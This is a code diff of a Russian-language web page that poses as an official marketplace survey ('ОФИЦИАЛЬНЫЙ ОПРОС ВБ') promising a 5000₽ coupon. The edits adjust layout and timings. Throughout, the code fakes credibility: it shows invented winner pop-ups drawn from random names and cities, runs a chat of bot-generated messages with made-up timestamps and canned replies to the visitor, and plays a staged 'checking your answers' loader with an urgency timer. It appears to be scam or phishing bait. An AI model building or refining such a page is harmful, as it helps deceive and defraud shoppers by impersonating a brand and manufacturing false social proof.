@@ -36,7 +36,6 @@
       box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.15);
     }
 
-    /* Шапка — исправлено: элементы не налезают */
     .hero-header {
       background: linear-gradient(135deg, #7B1FA2 0%, #E91E63 50%, #9C27B0 100%);
       padding: 32px 24px 24px;
@@ -89,11 +88,12 @@
       gap: 6px;
     }
 
+    /* Добавлен отступ сверху */
     .limited-offer {
       background: #FFF8E1;
       border-left: 4px solid #FF9800;
       padding: 12px 16px;
-      margin: 0 20px 20px;
+      margin: 8px 20px 20px;
       border-radius: 12px;
       font-size: 13px;
       font-weight: 600;
@@ -431,13 +431,14 @@
       cursor: pointer;
     }
 
-    /* Уведомления — вверху */
+    /* Уведомления — по центру вверху */
     .floating-notification {
       position: fixed;
       top: 20px;
-      right: 20px;
-      left: auto;
+      left: 50%;
+      transform: translateX(-50%);
       max-width: 340px;
+      width: 90%;
       background: white;
       border-radius: 16px;
       padding: 14px;
@@ -448,13 +449,13 @@
     }
 
     @keyframes slideDown {
-      from { transform: translateY(-100px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
+      from { transform: translateX(-50%) translateY(-100px); opacity: 0; }
+      to { transform: translateX(-50%) translateY(0); opacity: 1; }
     }
 
     @keyframes slideUp {
-      from { transform: translateY(0); opacity: 1; }
-      to { transform: translateY(-100px); opacity: 0; }
+      from { transform: translateX(-50%) translateY(0); opacity: 1; }
+      to { transform: translateX(-50%) translateY(-100px); opacity: 0; }
     }
 
     .notification-content {
@@ -481,9 +482,10 @@
       .question h3 { font-size: 18px; }
       .gift-amount { font-size: 44px; }
       .btn-claim { padding: 15px 20px; font-size: 16px; }
-      .floating-notification { right: 12px; left: auto; max-width: 300px; }
+      .floating-notification { width: 92%; max-width: 320px; }
       .stats-row { gap: 10px; }
       .timer-badge, .participants-badge { padding: 6px 14px; font-size: 12px; }
+      .limited-offer { margin-top: 8px; }
     }
   </style>
 </head>
@@ -491,7 +493,6 @@
 
 <div class="survey-container">
   <div class="card">
-    <!-- Шапка — исправлено: отступы, элементы не налезают -->
     <div class="hero-header">
       <div class="official-badge">⚡ ОФИЦИАЛЬНЫЙ ОПРОС ВБ</div>
       <h1>🎁 ПОЛУЧИТЕ КУПОН НА 5000₽</h1>
@@ -573,9 +574,9 @@
     <div class="loader-area" id="loaderArea">
       <div class="spinner"></div>
       <p style="font-weight: 600; margin-bottom: 16px;">Проверяем ваши ответы...</p>
-      <div class="loading-step" id="step1">✅ Анализ ответов...</div>
-      <div class="loading-step" id="step2">⏳ Проверка соответствия критериям...</div>
-      <div class="loading-step" id="step3">⏳ Подготовка купона...</div>
+      <div class="loading-step" id="step1">🔍 Анализ ответов...</div>
+      <div class="loading-step" id="step2">✅ Проверка соответствия критериям...</div>
+      <div class="loading-step" id="step3">🎁 Подготовка купона...</div>
     </div>
 
     <div class="final-area" id="finalArea">
@@ -630,9 +631,8 @@
   let notificationQueue = [];
   let isShowingNotif = false;
 
-  // Чат с правильной временной логикой
+  // Чат
   let lastMessageTime = new Date();
-  let messageInterval = null;
   
   const femaleNames = ["Анна", "Марина", "Ольга", "Елена", "Ирина", "Светлана", "Наталья", "Юлия", "Татьяна", "Виктория", "Екатерина", "Мария"];
   const maleNames = ["Сергей", "Дмитрий", "Александр", "Андрей", "Максим", "Алексей", "Иван", "Михаил", "Роман", "Павел"];
@@ -701,19 +701,31 @@
     document.getElementById('questionsArea').style.display = 'none';
     document.getElementById('loaderArea').classList.add('active');
     
+    // Исправлено: теперь все 3 шага последовательно активируются
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    
+    // Шаг 1 активен сразу
+    step1.classList.add('active');
+    
+    // Шаг 2 через 1.5 секунды
     setTimeout(() => {
-      document.getElementById('step2').classList.add('active');
+      step2.classList.add('active');
     }, 1500);
+    
+    // Шаг 3 через 3 секунды
     setTimeout(() => {
-      document.getElementById('step3').classList.add('active');
+      step3.classList.add('active');
     }, 3000);
     
+    // Переход на финальную страницу через 4.5 секунды
     setTimeout(() => {
       document.getElementById('loaderArea').classList.remove('active');
       document.getElementById('finalArea').classList.add('active');
       startFinalTimer();
       showSuccessNotif();
-    }, 5000);
+    }, 4500);
   }
 
   function initSurveyButtons() {
@@ -769,7 +781,7 @@
     }, 8000);
   }
 
-  // Уведомления вверху, реже (раз в 12-18 секунд)
+  // Уведомления по центру вверху, реже
   function createWinnerNotif() {
     const name = femaleNames[Math.floor(Math.random() * femaleNames.length)];
     const city = cities[Math.floor(Math.random() * cities.length)];
@@ -800,7 +812,6 @@
     if (!isShowingNotif) {
       processQueue();
     }
-    // Уведомления реже: 12-18 секунд
     setTimeout(scheduleNotifications, 12000 + Math.random() * 6000);
   }
 
@@ -828,7 +839,7 @@
     }, 4000);
   }
 
-  // ЧАТ С ПРАВИЛЬНОЙ ВРЕМЕННОЙ ЛИНИЕЙ
+  // ЧАТ
   function getFormattedTime() {
     return new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
   }
@@ -851,7 +862,6 @@
     while (container.children.length > 30) container.removeChild(container.firstChild);
   }
 
-  // Функция для отображения сообщений с реалистичными временными метками
   function displayMessageWithDelay(msg, delay) {
     setTimeout(() => {
       addChatMessage(msg.name, msg.text, msg.gender, false);
@@ -863,25 +873,18 @@
     const container = document.getElementById('chatMessages');
     container.innerHTML = '';
     
-    // Берем последние 10 сообщений для показа
     const recentMessages = chatMessagesList.slice(-10);
-    
-    // Рассчитываем временные интервалы: сообщения за последние 30 минут
     const now = new Date();
-    const baseTime = new Date(now.getTime() - 30 * 60 * 1000); // 30 минут назад
+    const baseTime = new Date(now.getTime() - 30 * 60 * 1000);
     
     let currentDelay = 0;
     
     recentMessages.forEach((msg, index) => {
-      // Имитация: сообщения распределены равномерно по времени
-      const minutesOffset = (index / recentMessages.length) * 30; // от 0 до 30 минут
+      const minutesOffset = (index / recentMessages.length) * 30;
       const msgTime = new Date(baseTime.getTime() + minutesOffset * 60 * 1000);
-      
-      // Рассчитываем задержку от текущего момента
       let displayDelay = Math.max(0, msgTime.getTime() - now.getTime());
       
       if (displayDelay <= 0 && index === recentMessages.length - 1) {
-        // Если сообщение уже в прошлом, показываем сразу
         displayDelay = 0;
       }
       
@@ -889,25 +892,19 @@
       currentDelay = displayDelay;
     });
     
-    // После загрузки истории запускаем генерацию новых сообщений
     setTimeout(() => {
       startNewMessagesGenerator();
     }, currentDelay + 1000);
     
-    // Настройка отправки сообщений от пользователя
     document.getElementById('chatSendBtn').addEventListener('click', sendUserMessage);
     document.getElementById('chatInput').addEventListener('keypress', (e) => {
       if (e.key === 'Enter') sendUserMessage();
     });
     
-    // Обновление онлайн-счетчика
     setInterval(updateOnlineCount, 15000);
   }
 
   function startNewMessagesGenerator() {
-    // Генерация новых сообщений каждые 15-45 секунд
-    if (messageInterval) clearInterval(messageInterval);
-    
     function generateMessage() {
       if (isSurveyActive || document.getElementById('finalArea').classList.contains('active')) {
         const isFemale = Math.random() > 0.4;
@@ -923,7 +920,7 @@
     }
     
     function scheduleNextMessage() {
-      const delay = 15000 + Math.random() * 30000; // 15-45 секунд
+      const delay = 15000 + Math.random() * 30000;
       setTimeout(generateMessage, delay);
     }
     
@@ -937,7 +934,6 @@
     addChatMessage('Вы', text, 'user', true);
     input.value = '';
     
-    // Ответ через 3-7 секунд
     setTimeout(() => {
       const responses = ["Отлично! Удачи в розыгрыше! 🍀", "Скоро и вы получите свои 5000₽!", "Спасибо за участие!", "Успевайте, акция заканчивается!"];
       const reply = responses[Math.floor(Math.random() * responses.length)];
